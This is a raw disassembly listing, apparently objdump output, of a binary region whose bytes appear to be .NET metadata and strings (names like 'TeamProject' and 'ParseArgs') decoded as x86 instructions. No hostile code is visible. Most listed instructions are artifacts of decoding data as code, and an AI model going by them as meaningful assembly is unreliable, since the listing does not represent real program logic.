  4033d5:	add    BYTE PTR [esi],dl
  4033d7:	pop    es
  4033d8:	dec    ecx
  4033d9:	add    DWORD PTR [esi],eax
  4033db:	add    BYTE PTR [ebp+0x7],cl
  4033de:	push   0x0
  4033e0:	push   es
  4033e1:	add    BYTE PTR [edx+0x7],ah
  4033e4:	push   0x0
  4033e6:	push   cs
  4033e7:	add    BYTE PTR [ebx+0x7],dh
  4033ea:	aaa    
  4033eb:	add    BYTE PTR [edx],dl
  4033ed:	add    BYTE PTR [edi+eax*1+0xe006a],cl
  4033f4:	lods   al,BYTE PTR ds:[esi]
  4033f5:	pop    es
  4033f6:	aaa    
  4033f7:	add    BYTE PTR [esi],cl
  4033f9:	add    ch,ah
  4033fb:	pop    es
  4033fc:	aaa    
  4033fd:	add    BYTE PTR [esi],al
  4033ff:	add    BYTE PTR [edx],bl
  403401:	or     BYTE PTR [edx+0x0],ch
  403404:	push   es
  403405:	add    BYTE PTR [edx+0x8],cl
  403408:	push   0x0
  40340a:	or     eax,DWORD PTR [eax]
  40340c:	jns    0x403416
  40340e:	add    BYTE PTR [eax],al
  403410:	push   es
  403411:	add    BYTE PTR [eax+ecx*1+0x608b2],bh
  403418:	ror    DWORD PTR [eax],1
  40341a:	push   0x0
  40341c:	push   ss
  40341d:	add    BYTE PTR [eax],ah
  40341f:	or     DWORD PTR [edi],eax
  403421:	or     DWORD PTR [esi],eax
  403423:	add    BYTE PTR [edx+0x9],ch
  403426:	push   0x0
  403428:	push   es
  403429:	add    ch,dl
  40342b:	or     DWORD PTR [ebx+0xb000605],edi
  403431:	or     dh,al
  403433:	or     DWORD PTR [edx],ebx
  403435:	add    BYTE PTR [esi+0xa],ch
  403438:	push   esi
  403439:	or     al,BYTE PTR [esi]
  40343b:	add    BYTE PTR [ebp+0x605f90a],al
  403441:	add    BYTE PTR [edx+0x6006a0a],dh
  403447:	add    BYTE PTR [edi+0x6006a0a],dh
  40344d:	add    bl,bl
  40344f:	or     bl,BYTE PTR [eax]
  403451:	add    al,0x1a
  403453:	add    BYTE PTR [ecx],dl
  403455:	or     edi,ebx
  403457:	or     bl,BYTE PTR [edx]
  403459:	add    BYTE PTR [edx],ch
  40345b:	or     edi,ebx
  40345d:	or     al,BYTE PTR [eax]
  40345f:	add    BYTE PTR [eax],al
  403461:	add    BYTE PTR [ecx],al
  403463:	add    BYTE PTR [eax],al
  403465:	add    BYTE PTR [eax],al
  403467:	add    BYTE PTR [ecx],al
  403469:	add    BYTE PTR [ecx],al
  40346b:	add    BYTE PTR [eax],al
  40346d:	add    DWORD PTR [eax],edx
  40346f:	add    BYTE PTR [edi],bl
  403471:	add    BYTE PTR [edi],dh
  403473:	add    BYTE PTR ds:0x1000100,al
  403479:	add    BYTE PTR [eax],al
  40347b:	add    BYTE PTR [eax],dl
  40347d:	add    BYTE PTR [edi+0x0],dl
  403480:	add    BYTE PTR [eax],al
  403482:	add    eax,0x7000600
  403487:	add    BYTE PTR [eax],al
  403489:	add    BYTE PTR [eax],al
  40348b:	add    BYTE PTR [eax+0x5000009],dl
  403491:	add    BYTE PTR [eax],cl
  403493:	add    BYTE PTR [edx],bl
  403495:	add    BYTE PTR [ecx],dl
  403497:	add    BYTE PTR [eax+0x0],bh
  40349a:	or     al,BYTE PTR [eax]
  40349c:	adc    DWORD PTR [eax],eax
  40349e:	jle    0x4034a0
  4034a0:	or     eax,0x85001100
  4034a5:	add    BYTE PTR ds:0x91001100,cl
  4034ab:	add    BYTE PTR [edx],cl
  4034ad:	add    BYTE PTR [ecx],dl
  4034af:	add    BYTE PTR [ebx+0x11000a00],bl
  4034b5:	add    BYTE PTR ds:0x11002e01,bh
  4034bb:	add    BYTE PTR [edx+0x1],ch
  4034be:	xor    al,BYTE PTR [eax]
  4034c0:	adc    eax,DWORD PTR [eax]
  4034c2:	sbb    BYTE PTR [edx],cl
  4034c4:	mov    cl,0x1
  4034c6:	push   eax
  4034c7:	and    DWORD PTR [eax],eax
  4034c9:	add    BYTE PTR [eax],al
  4034cb:	add    BYTE PTR [esi+0x1000a600],dl
  4034d1:	add    BYTE PTR [ecx],al
  4034d3:	add    BYTE PTR [ebx+eiz*1+0x0],bh
  4034d7:	add    BYTE PTR [eax],al
  4034d9:	add    BYTE PTR [ecx+0x1f00f900],dl
  4034df:	add    BYTE PTR [edx],al
  4034e1:	add    BYTE PTR [ebx+eiz*1+0x0],cl
  4034e8:	xchg   ecx,eax
  4034e9:	add    BYTE PTR [esi],al
  4034eb:	add    DWORD PTR [eax],edx
  4034ed:	add    BYTE PTR [eax+eax*1],al
  4034f0:	fsub   DWORD PTR ds:0x0
  4034f6:	xchg   ecx,eax
  4034f7:	add    BYTE PTR [eax],dl
  4034f9:	add    DWORD PTR [esi],esp
  4034fb:	add    BYTE PTR ds:0x266400,al
  403501:	add    BYTE PTR [eax],al
  403503:	add    BYTE PTR [esi+0x2a011618],al
  403509:	add    BYTE PTR ds:0x264400,al
  40350f:	add    BYTE PTR [eax],al
  403511:	add    BYTE PTR [ecx+0x260a4f18],dl
  403517:	add    BYTE PTR ds:0x266c00,al
  40351d:	add    BYTE PTR [eax],al
  40351f:	add    BYTE PTR [ebx+0x2a011618],al
  403525:	add    BYTE PTR ds:0x267400,al
  40352b:	add    BYTE PTR [eax],al
  40352d:	add    BYTE PTR [ebx+0x36017a08],dl
  403533:	add    BYTE PTR ds:0x26b300,al
  403539:	add    BYTE PTR [eax],al
  40353b:	add    BYTE PTR [ebx+0x3b018e08],dl
  403541:	add    BYTE PTR ds:0x26ba00,al
  403547:	add    BYTE PTR [eax],al
  403549:	add    BYTE PTR [ebx+0x40019a08],dl
  40354f:	add    BYTE PTR ds:0x26c200,al
  403555:	add    BYTE PTR [eax],al
  403557:	add    BYTE PTR [ebx+0x4601a608],dl
  40355d:	add    BYTE PTR [esi],al
  40355f:	add    al,bl
  403561:	add    BYTE PTR es:[eax],al
  403564:	add    BYTE PTR [eax],al
  403566:	xchg   ebx,eax
  403567:	or     BYTE PTR [ecx+0x6004601],dh
  40356d:	add    dh,ch
  40356f:	add    BYTE PTR es:[eax],al
  403572:	add    BYTE PTR [eax],al
  403574:	xchg   ebx,eax
  403575:	or     bl,al
  403577:	add    DWORD PTR [esi+0x0],eax
  40357a:	push   es
  40357b:	add    BYTE PTR [edi+eiz*1],al
  40357e:	add    BYTE PTR [eax],al
  403580:	add    BYTE PTR [eax],al
  403582:	xchg   ebx,eax
  403583:	or     cl,ah
  403585:	add    DWORD PTR [esi+0x0],eax
  403588:	push   es
  403589:	add    BYTE PTR [edx],bl
  40358b:	daa    
  40358c:	add    BYTE PTR [eax],al
  40358e:	add    BYTE PTR [eax],al
  403590:	xchg   ebx,eax
  403591:	or     bl,dh
  403593:	add    DWORD PTR [esi+0x0],eax
  403596:	push   es
  403597:	add    BYTE PTR [eax],dh
  403599:	daa    
  40359a:	add    BYTE PTR [eax],al
  40359c:	add    BYTE PTR [eax],al
  40359e:	xchg   ebx,eax
  40359f:	or     BYTE PTR [eax],al
  4035a1:	add    al,BYTE PTR [esi+0x0]
  4035a4:	push   es
  4035a5:	add    BYTE PTR [esi+0x27],al
  4035a8:	add    BYTE PTR [eax],al
  4035aa:	add    BYTE PTR [eax],al
  4035ac:	xchg   ebx,eax
  4035ad:	or     BYTE PTR [esi],bl
  4035af:	add    al,BYTE PTR [esi+0x0]
  4035b2:	push   es
  4035b3:	add    BYTE PTR [edi+eiz*1+0x0],bl
  4035b7:	add    BYTE PTR [eax],al
  4035b9:	add    BYTE PTR [ebx+0x46023008],dl
  4035bf:	add    BYTE PTR [esi],al
  4035c1:	add    BYTE PTR [edx+0x27],dh
  4035c4:	add    BYTE PTR [eax],al
  4035c6:	add    BYTE PTR [eax],al
  4035c8:	xchg   ebx,eax
  4035c9:	or     BYTE PTR [edx],bh
  4035cb:	add    al,BYTE PTR [esi+0x0]
  4035ce:	push   es
  4035cf:	add    BYTE PTR [eax+0x27],cl
  4035d5:	add    BYTE PTR [ebx+0x46024508],dl
  4035db:	add    BYTE PTR [esi],al
  4035dd:	add    BYTE PTR [esi+0x27],bl
  4035e3:	add    BYTE PTR [ebx+0x46025908],dl
  4035e9:	add    BYTE PTR [esi],al
  4035eb:	add    BYTE PTR [edi+eiz*1+0x0],dh
  4035f2:	xchg   ebx,eax
  4035f3:	or     BYTE PTR [eax+0x2],ch
  4035f6:	inc    esi
  4035f7:	add    BYTE PTR [esi],al
  4035f9:	add    dl,cl
  4035fb:	daa    
  4035fc:	add    BYTE PTR [eax],al
  4035fe:	add    BYTE PTR [eax],al
  403600:	xchg   ebx,eax
  403601:	or     BYTE PTR [ebx+0x6004602],al
  403607:	add    al,ah
  403609:	daa    
  40360a:	add    BYTE PTR [eax],al
  40360c:	add    BYTE PTR [eax],al
  40360e:	xchg   ebx,eax
  40360f:	or     BYTE PTR [eax+0x6004602],bl
  403615:	add    dh,dh
  403617:	daa    
  403618:	add    BYTE PTR [eax],al
  40361a:	add    BYTE PTR [eax],al
  40361c:	xchg   ebx,eax
  40361d:	or     BYTE PTR [edi+0x6004602],ah
  403623:	add    BYTE PTR [eax],al
  403625:	add    BYTE PTR [ecx],al
  403627:	add    BYTE PTR [edx+0x1000003],cl
  40362d:	add    BYTE PTR [edi+0x2000003],cl
  403633:	add    BYTE PTR [edx+0x1000003],cl
  403639:	add    BYTE PTR [edx+0x1000003],cl
  40363f:	add    BYTE PTR [esi+0x16003103],dl
  403645:	add    DWORD PTR [eax+0x0],ebx
  403648:	cmp    DWORD PTR [eax],eax
  40364a:	push   ss
  40364b:	add    DWORD PTR [ebp+0x0],ebx
  40364e:	inc    ecx
  40364f:	add    BYTE PTR [esi],dl
  403651:	add    DWORD PTR [ebp+0x0],ebx
  403654:	dec    ecx
  403655:	add    BYTE PTR [esi],dl
  403657:	add    DWORD PTR [eax+0x0],ebx
  40365a:	push   ecx
  40365b:	add    BYTE PTR [esi],dl
  40365d:	add    DWORD PTR [eax+0x0],ebx
  403660:	pop    ecx
  403661:	add    BYTE PTR [esi],dl
  403663:	add    DWORD PTR [eax+0x0],ebx
  403666:	popa   
  403667:	add    BYTE PTR [esi],dl
  403669:	add    DWORD PTR [eax+0x0],ebx
  40366c:	imul   eax,DWORD PTR [eax],0x580116
  403672:	jno    0x403674
  403674:	push   ss
  403675:	add    DWORD PTR [eax+0x0],ebx
  403678:	jns    0x40367a
  40367a:	push   ss
  40367b:	add    DWORD PTR [eax+0x0],ebx
  40367e:	add    DWORD PTR [eax],0x580116
  403684:	mov    DWORD PTR [eax],eax
  403686:	push   ss
  403687:	add    DWORD PTR [eax+0x0],ebx
  40368a:	xchg   ecx,eax
  40368b:	add    BYTE PTR [esi],dl
  40368d:	add    DWORD PTR [eax+0x0],ebx
  403690:	cdq    
  403691:	add    BYTE PTR [esi],dl
  403693:	add    DWORD PTR [eax+0x0],ebx
  403696:	mov    eax,ds:0x5d011600
  40369b:	add    BYTE PTR [ecx+0x58011600],ch
  4036a1:	add    BYTE PTR [ecx+0x62011600],dh
  4036a7:	add    BYTE PTR [ecx+0x2a011600],bh
  4036ad:	add    cl,al
  4036af:	add    BYTE PTR [esi],dl
  4036b1:	add    DWORD PTR [eax+0x0],ebp
  4036b4:	rol    DWORD PTR [eax],1
  4036b6:	push   ss
  4036b7:	add    DWORD PTR [esi+0x0],ebp
  4036ba:	fld    DWORD PTR [eax]
  4036bc:	js     0x4036c4
  4036be:	adc    eax,0x8a002901
  4036c3:	push   es
  4036c4:	cmp    eax,DWORD PTR [eax]
  4036c6:	sub    DWORD PTR [eax],eax
  4036c8:	lahf   
  4036c9:	push   es
  4036ca:	sbb    al,BYTE PTR [ecx]
  4036cc:	fld    DWORD PTR [eax]
  4036ce:	mov    ebx,0xe1011f06
  4036d3:	add    ch,ch
  4036d5:	push   es
  4036d6:	and    eax,0xe901
  4036db:	pop    es
  4036dc:	sub    al,BYTE PTR [ecx]
  4036de:	jmp    0x254743e3
  4036e3:	add    ecx,ebx
  4036e5:	add    BYTE PTR [edx+0x29011a06],cl
  4036eb:	add    BYTE PTR [edi],bl
  4036ed:	pop    es
  4036ee:	cs add ecx,esi
  4036f1:	add    BYTE PTR [edi+eax*1],ch
  4036f4:	sub    al,BYTE PTR [ecx]
  4036f6:	icebp  
  4036f7:	add    BYTE PTR [edi+eax*1],bh
  4036fa:	sub    al,BYTE PTR [ecx]
  4036fc:	sub    DWORD PTR [eax],eax
  4036fe:	push   ss
  4036ff:	add    DWORD PTR [eax+0x0],ebx
  403702:	stc    
  403703:	add    BYTE PTR [edi+eax*1+0x33],dl
  403707:	add    DWORD PTR [ecx],eax
  403709:	add    DWORD PTR [esi+0x7],ebp
  40370c:	cmp    BYTE PTR [ecx],al
  40370e:	or     DWORD PTR [ecx],eax
  403710:	nop
  403711:	pop    es
  403712:	cmp    eax,0xcc011901
  403717:	pop    es
  403718:	inc    esp
  403719:	add    DWORD PTR [ecx],esp
  40371b:	add    ebx,esi
  40371d:	pop    es
  40371e:	sub    al,BYTE PTR [eax]
  403720:	adc    DWORD PTR [eax],eax
  403722:	push   ss
  403723:	add    DWORD PTR [ebp+0x1],ecx
  403726:	sub    DWORD PTR [eax],eax
  403728:	pop    es
  403729:	or     BYTE PTR [ebx],bh
  40372b:	add    cl,bh
  40372d:	add    BYTE PTR [edx],ch
  40372f:	or     BYTE PTR [esi+0x1],dl
  403732:	loope  0x403734
  403734:	xor    DWORD PTR [eax],ecx
  403736:	pusha  
  403737:	add    ecx,esp
  403739:	add    BYTE PTR [edi],dh
  40373b:	or     BYTE PTR [esi+0x0],al
  40373e:	loope  0x403740
  403740:	inc    eax
  403741:	or     BYTE PTR [esi],ah
  403743:	add    cl,bh
  403745:	add    BYTE PTR [ebx+0x8],bl
  403748:	add    DWORD PTR gs:[ecx],edx
  40374b:	add    BYTE PTR [esi+0x8],ah
  40374e:	ins    DWORD PTR es:[edi],dx
  40374f:	add    DWORD PTR [ecx],edi
  403751:	add    DWORD PTR [esi],edx
  403753:	add    DWORD PTR [ecx+0x1],esi
  403756:	adc    DWORD PTR [eax],eax
  403758:	mov    WORD PTR [eax],cs
  40375a:	ja     0x40375d
  40375c:	adc    DWORD PTR [eax],eax
  40375e:	pushf  
  40375f:	or     BYTE PTR [ebp+0x0],bl
  403762:	adc    DWORD PTR [eax],eax
  403764:	stos   DWORD PTR es:[edi],eax
  403765:	or     BYTE PTR [edx],ch
  403767:	add    cl,ah
  403769:	add    bh,al
  40376b:	or     BYTE PTR [esi+0x1],bh
  40376e:	inc    ecx
  40376f:	add    DWORD PTR [eax+0x8],eax
  403772:	pop    eax
  403773:	add    BYTE PTR [ecx+0x1],cl
  403776:	fisttp DWORD PTR [eax]
  403778:	test   BYTE PTR [ecx],al
  40377a:	sbb    DWORD PTR [eax],eax
  40377c:	dec    ecx
  40377d:	or     DWORD PTR [ecx+eax*1+0x84000e1],eax
  403784:	pusha  
  403785:	add    ecx,edi
  403787:	add    BYTE PTR [ebp+0x9],dl
  40378a:	sub    al,BYTE PTR [ecx]
  40378c:	stc    
  40378d:	add    BYTE PTR [eax+0x9],ah
  403790:	fwait
  403791:	add    ecx,edi
  403793:	add    BYTE PTR [edi+0x9],ch
  403796:	mov    al,ds:0x7500f901
  40379b:	or     DWORD PTR [edi+0x7f00f901],esp
  4037a1:	or     DWORD PTR [ecx+eax*1+0x1160161],eax
  4037a8:	sub    al,BYTE PTR [eax]
  4037aa:	or     al,0x0
  4037ac:	push   ss
  4037ad:	add    DWORD PTR [esi+0x0],ebp
  4037b0:	or     al,0x0
  4037b2:	sub    al,0xa
  4037b4:	ret    0xc01
  4037b7:	add    BYTE PTR [eax],dh
  4037b9:	or     cl,dl
  4037bb:	add    ecx,edi
  4037bd:	add    BYTE PTR [edx+ecx*1],bh
  4037c0:	rol    DWORD PTR [ecx],cl
  4037c2:	stc    
  4037c3:	add    BYTE PTR [eax+0xa],cl
  4037c6:	fld    DWORD PTR [ecx]
  4037c8:	or     DWORD PTR [eax],eax
  4037ca:	push   ss
  4037cb:	add    DWORD PTR [edx],ebp
  4037cd:	add    BYTE PTR [ecx+0x1],dh
  4037d0:	push   ss
  4037d1:	add    DWORD PTR [edx+0x0],esp
  4037d4:	jns    0x4037d7
  4037d6:	push   ss
  4037d7:	add    DWORD PTR [edx],ebp
  4037d9:	add    BYTE PTR [ecx],cl
  4037db:	add    BYTE PTR [edx-0x7efdcbf6],ah
  4037e1:	add    ecx,ecx
  4037e3:	or     bh,BYTE PTR [edx]
  4037e5:	add    al,BYTE PTR [ecx+0x430ae401]
  4037eb:	add    ah,BYTE PTR [ecx]
  4037ed:	add    BYTE PTR [esi],dl
  4037ef:	add    DWORD PTR [ecx+0x2],ecx
  4037f2:	and    DWORD PTR [eax],eax
  4037f4:	icebp  
  4037f5:	or     dl,BYTE PTR [esi+0x2]
  4037f8:	cdq    
  4037f9:	add    DWORD PTR [esi],edx
  4037fb:	add    DWORD PTR [ebp+0x2],ebx
  4037fe:	sub    DWORD PTR [eax],eax
  403800:	push   ebx
  403801:	add    ah,BYTE PTR [edx+eax*1+0x2e]
  403805:	add    BYTE PTR [ebx],bh
  403807:	add    bl,cl
  403809:	add    ch,BYTE PTR [esi]
  40380b:	add    BYTE PTR [ebx+0x0],al
  40380e:	out    0x2,al
  403810:	add    BYTE PTR cs:[ebx+0x2e06ff00],ah
  403817:	add    BYTE PTR [ebx+0x0],bl
  40381a:	inc    eax
  40381b:	add    ebp,DWORD PTR [esi]
  40381d:	add    BYTE PTR [ebx+0x2e026400],bl
  403823:	add    BYTE PTR [ebx],dl
  403825:	add    BYTE PTR [ebp+0x1b002e02],ah
  40382b:	add    BYTE PTR [ebx+0x23002e02],ch
  403831:	add    BYTE PTR [ecx+0x2b002e02],dh
  403837:	add    BYTE PTR [ecx+0x33002e02],dh
  40383d:	add    BYTE PTR [ecx+0x4b002e02],dh
  403843:	add    BYTE PTR [ebx+eax*1],cl
  403846:	add    BYTE PTR cs:[ebx],cl
  403849:	add    BYTE PTR [ebp+0x2],ch
  40384c:	add    BYTE PTR cs:[ebx+0x0],ah
  403850:	inc    eax
  403851:	add    ebp,DWORD PTR [esi]
  403853:	add    BYTE PTR [ebx+0x0],ch
  403856:	push   edx
  403857:	add    ebp,DWORD PTR [esi]
  403859:	add    BYTE PTR [ebx+0x0],dh
  40385c:	pusha  
  40385d:	add    ebp,DWORD PTR [esi]
  40385f:	add    BYTE PTR [ebx+0x0],bh
  403862:	stos   DWORD PTR es:[edi],eax
  403863:	add    ch,BYTE PTR [esi]
  403865:	add    BYTE PTR [ebx+0x2e036b00],al
  40386b:	add    BYTE PTR [ebx+0x2e039600],cl
  403871:	add    BYTE PTR [ebx+0x4906e000],dl
  403877:	add    BYTE PTR [ebx+0x2],dl
  40387a:	add    ah,BYTE PTR fs:[ebx+0x0]
  40387e:	jecxz  0x403881
  403880:	lods   al,BYTE PTR ds:[esi]
  403881:	add    DWORD PTR [ebx+0x0],esp
  403884:	and    eax,DWORD PTR [edx]
  403886:	lods   al,BYTE PTR ds:[esi]
  403887:	add    DWORD PTR [ebx+0x0],esp
  40388a:	sbb    eax,DWORD PTR [edx]
  40388c:	repz add DWORD PTR [ebx-0x53fe1d00],eax
  403893:	add    DWORD PTR [eax+0x5101df01],ecx
  403899:	add    al,BYTE PTR [ebx]
  40389b:	add    BYTE PTR [ecx],al
  40389d:	add    BYTE PTR [eax],al
  40389f:	add    BYTE PTR ds:0x4a01,ch
  4038a5:	add    BYTE PTR [ebp+0x4f02],dh
  4038ab:	add    BYTE PTR [ebp+0x5402],bh
  4038b1:	add    ah,al
  4038b3:	add    dl,BYTE PTR [eax+eax*1+0x0]
  4038b7:	add    dl,dl
  4038b9:	add    dl,BYTE PTR [eax+eax*1+0x0]
  4038bd:	add    ah,ch
  4038bf:	add    dl,BYTE PTR [eax+eax*1+0x0]
  4038c3:	add    dl,bh
  4038c5:	add    dl,BYTE PTR [eax+eax*1+0x0]
  4038c9:	add    BYTE PTR [ebx],al
  4038cb:	add    edx,DWORD PTR [eax+eax*1+0x0]
  4038cf:	add    BYTE PTR ds:0x5403,bl
  4038d5:	add    BYTE PTR [eax],dl
  4038d7:	add    DWORD PTR [eax+eax*1+0x0],edx
  4038db:	add    BYTE PTR [ebx],ch
  4038dd:	add    edx,DWORD PTR [eax+eax*1+0x0]
  4038e1:	add    BYTE PTR [edx],dh
  4038e3:	add    edx,DWORD PTR [eax+eax*1+0x0]
  4038e7:	add    BYTE PTR [edx+0x3],al
  4038ea:	push   esp
  4038eb:	add    BYTE PTR [eax],al
  4038ed:	add    BYTE PTR [ebp+0x3],cl
  4038f0:	push   esp
  4038f1:	add    BYTE PTR [eax],al
  4038f3:	add    BYTE PTR [ebx+eax*1+0x54],ah
  4038f7:	add    BYTE PTR [eax],al
  4038f9:	add    BYTE PTR [ebp+0x3],dh
  4038fc:	push   esp
  4038fd:	add    BYTE PTR [eax],al
  4038ff:	add    BYTE PTR [eax+0x2005403],al
  403905:	add    BYTE PTR [eax],cl
  403907:	add    BYTE PTR [ebx],al
  403909:	add    BYTE PTR [edx],al
  40390b:	add    BYTE PTR [ecx],cl
  40390d:	add    BYTE PTR ds:0xa000100,al
  403913:	add    BYTE PTR ds:0xb000200,al
  403919:	add    BYTE PTR [edi],al
  40391b:	add    BYTE PTR [edx],al
  40391d:	add    BYTE PTR [eax+eax*1],cl
  403920:	or     DWORD PTR [eax],eax
  403922:	add    al,BYTE PTR [eax]
  403924:	or     eax,0x2000b00
  403929:	add    BYTE PTR [esi],cl
  40392b:	add    BYTE PTR ds:0xf000200,cl
  403931:	add    BYTE PTR [edi],cl
  403933:	add    BYTE PTR [edx],al
  403935:	add    BYTE PTR [eax],dl
  403937:	add    BYTE PTR [ecx],dl
  403939:	add    BYTE PTR [edx],al
  40393b:	add    BYTE PTR [ecx],dl
  40393d:	add    BYTE PTR [ebx],dl
  40393f:	add    BYTE PTR [edx],al
  403941:	add    BYTE PTR [edx],dl
  403943:	add    BYTE PTR ds:0x13000200,dl
  403949:	add    BYTE PTR [edi],dl
  40394b:	add    BYTE PTR [edx],al
  40394d:	add    BYTE PTR [eax+eax*1],dl
  403950:	sbb    DWORD PTR [eax],eax
  403952:	add    al,BYTE PTR [eax]
  403954:	adc    eax,0x2001b00
  403959:	add    BYTE PTR [esi],dl
  40395b:	add    BYTE PTR ds:0x17000200,bl
  403961:	add    BYTE PTR [edi],bl
  403963:	add    BYTE PTR [edx],al
  403965:	add    BYTE PTR [eax],bl
  403967:	add    BYTE PTR [ecx],ah
  403969:	add    BYTE PTR [edx],al
  40396b:	add    BYTE PTR [ecx],bl
  40396d:	add    BYTE PTR [ebx],ah
  40396f:	add    BYTE PTR [edx+0x800401],bh
  403975:	add    BYTE PTR [ebx],cl
  403977:	add    BYTE PTR [eax],al
  403979:	add    BYTE PTR [eax],al
  40397b:	add    BYTE PTR [eax],al
  40397d:	add    BYTE PTR [ecx],al
  40397f:	add    BYTE PTR [eax],al
  403981:	add    BYTE PTR [ebx+0x0],dh
  403984:	dec    edi
  403985:	push   es
  403986:	add    BYTE PTR [eax],al
  403988:	add    al,0x0
	...
  403992:	add    BYTE PTR [eax],al
  403994:	add    DWORD PTR [eax],eax
  403996:	popa   
  403997:	add    BYTE PTR [eax],al
  403999:	add    BYTE PTR [eax],al
  40399b:	add    BYTE PTR [ebx],cl
	...
  4039a5:	add    BYTE PTR [eax],al
  4039a7:	add    BYTE PTR [esi],dl
  4039a9:	add    BYTE PTR [ebx+0x0],ch
  4039af:	add    BYTE PTR [ebx],cl
	...
  4039b9:	add    BYTE PTR [eax],al
  4039bb:	add    BYTE PTR [esi],dl
  4039bd:	add    BYTE PTR [edi],dh
  4039bf:	add    BYTE PTR [eax],al
  4039c1:	add    BYTE PTR [eax],al
  4039c3:	add    BYTE PTR [edx],al
	...
  4039cd:	add    BYTE PTR [eax],al
  4039cf:	add    BYTE PTR [ecx],al
  4039d1:	add    BYTE PTR [edx+0x0],ch
  4039d4:	add    BYTE PTR [eax],al
  4039d6:	add    BYTE PTR [eax],al
  4039d8:	or     eax,DWORD PTR [eax]
	...
  4039e2:	add    BYTE PTR [eax],al
  4039e4:	push   ss
  4039e5:	add    bh,ah
  4039e7:	or     BYTE PTR [eax],al
  4039e9:	add    BYTE PTR [eax],al
  4039eb:	add    BYTE PTR [eax+eax*1],al
	...
  4039f6:	add    BYTE PTR [eax],al
  4039f8:	add    DWORD PTR [eax],eax
  4039fa:	push   0x0
	...
  403a04:	add    DWORD PTR [eax],eax
  403a06:	add    BYTE PTR [eax],al
  403a08:	aas    
  403a09:	or     eax,DWORD PTR [eax]
  403a0b:	add    BYTE PTR [eax],al
  403a0d:	add    BYTE PTR [eax],al
  403a0f:	add    BYTE PTR [eax],al
  403a11:	cmp    al,0x4d
  403a13:	outs   dx,DWORD PTR ds:[esi]
  403a14:	fs jne 0x403a83
  403a17:	gs add BYTE PTR ds:[esi+eiz*2+0x73],dl
  403a1d:	inc    esp
  403a1e:	gs ins BYTE PTR es:[edi],dx
  403a20:	gs je  0x403a88
  403a23:	push   eax
  403a24:	jb     0x403a95
  403a26:	push   0x65
  403a28:	arpl   WORD PTR [esi+ebp*1+0x65],si
  403a2c:	js     0x403a93
  403a2e:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  403a32:	gs je  0x403a9a
  403a35:	push   esp
  403a36:	gs popa 
  403a38:	ins    DWORD PTR es:[edi],dx
  403a39:	push   eax
  403a3a:	jb     0x403aab
  403a3c:	push   0x65
  403a3e:	arpl   WORD PTR [esp+eax*2+0x72],si
  403a42:	imul   esi,DWORD PTR [esi+0x65],0x694d0072
  403a49:	arpl   WORD PTR [edx+0x6f],si
  403a4c:	jae    0x403abd
  403a4e:	data16 je 0x403a7f
  403a51:	push   esp
  403a52:	gs popa 
  403a54:	ins    DWORD PTR es:[edi],dx
  403a55:	inc    esi
  403a56:	outs   dx,DWORD PTR ds:[esi]
  403a57:	jne    0x403ac7
  403a59:	fs popa 
  403a5b:	je     0x403ac6
  403a5d:	outs   dx,DWORD PTR ds:[esi]
  403a5e:	outs   dx,BYTE PTR ds:[esi]
  403a5f:	cs inc ebx
  403a61:	ins    BYTE PTR es:[edi],dx
  403a62:	imul   esp,DWORD PTR [ebp+0x6e],0x65520074
  403a69:	jae    0x403ada
  403a6b:	jne    0x403adf
  403a6d:	arpl   WORD PTR [ebp+0x73],sp
  403a70:	add    BYTE PTR [ebp+0x73],ch
  403a73:	arpl   WORD PTR [edi+0x72],bp
  403a76:	ins    BYTE PTR es:[edi],dx
  403a77:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  403a7e:	gs ins DWORD PTR es:[edi],dx
  403a80:	add    BYTE PTR [edi+0x62],cl
  403a83:	push   0x65
  403a85:	arpl   WORD PTR [eax+eax*1+0x66],si
  403a89:	outs   dx,DWORD PTR ds:[esi]
  403a8a:	jb     0x403aef
  403a8c:	add    BYTE PTR gs:[ebx+0x65],dh
  403a90:	jb     0x403b08
  403a92:	gs jb  0x403a95
  403a95:	jo     0x403b09
  403a97:	outs   dx,DWORD PTR ds:[esi]
  403a98:	push   0x65
  403a9a:	arpl   WORD PTR [esi+ecx*2+0x61],si
  403a9e:	ins    DWORD PTR es:[edi],dx
  403a9f:	add    BYTE PTR gs:[edi+ebp*2+0x43],ah
  403aa4:	outs   dx,DWORD PTR ds:[esi]
  403aa5:	outs   dx,BYTE PTR ds:[esi]
  403aa6:	imul   si,WORD PTR [edx+0x6d],0x6500
  403aac:	js     0x403b11
  403aae:	ins    BYTE PTR es:[edi],dx
  403aaf:	jne    0x403b15
  403ab1:	gs push edi
  403ab3:	jae    0x403b28
  403ab5:	add    BYTE PTR [ebp+0x61],cl
  403ab8:	imul   ebp,DWORD PTR [esi+0x0],0x7263694d
  403abf:	outs   dx,DWORD PTR ds:[esi]
  403ac0:	jae    0x403b31
  403ac2:	data16 je 0x403af3
  403ac5:	push   esp
  403ac6:	gs popa 
  403ac8:	ins    DWORD PTR es:[edi],dx
  403ac9:	inc    esi
  403aca:	outs   dx,DWORD PTR ds:[esi]
  403acb:	jne    0x403b3b
  403acd:	fs popa 
  403acf:	je     0x403b3a
  403ad1:	outs   dx,DWORD PTR ds:[esi]
  403ad2:	outs   dx,BYTE PTR ds:[esi]
  403ad3:	cs inc esp
  403ad5:	gs ins BYTE PTR es:[edi],dx
  403ad7:	gs je  0x403b3f
  403ada:	push   esp
  403adb:	gs popa 
  403add:	ins    DWORD PTR es:[edi],dx
  403ade:	push   eax
  403adf:	jb     0x403b50
  403ae1:	push   0x65
  403ae3:	arpl   WORD PTR [eax+eax*1+0x54],si
  403ae7:	gs popa 
  403ae9:	ins    DWORD PTR es:[edi],dx
  403aea:	push   eax
  403aeb:	jb     0x403b5c
  403aed:	push   0x65
  403aef:	arpl   WORD PTR [esp+eax*2+0x65],si
  403af3:	ins    BYTE PTR es:[edi],dx
  403af4:	gs je  0x403b5c
  403af7:	jb     0x403af9
  403af9:	push   ebx
  403afa:	je     0x403b5d
  403afc:	je     0x403b73
  403afe:	jae    0x403b45
  403b00:	jbe    0x403b67
  403b02:	outs   dx,BYTE PTR ds:[esi]
  403b03:	je     0x403b46
  403b05:	jb     0x403b6e
  403b07:	jae    0x403b09
  403b09:	push   ebx
  403b0a:	je     0x403b6d
  403b0c:	je     0x403b83
  403b0e:	jae    0x403b65
  403b10:	jo     0x403b76
  403b12:	popa   
  403b13:	je     0x403b7a
  403b15:	add    BYTE PTR [eax+0x61],dl
  403b18:	jb     0x403b8d
  403b1a:	gs inc ecx
  403b1c:	jb     0x403b85
  403b1e:	jae    0x403b20
  403b20:	push   ebp
  403b21:	jae    0x403b84
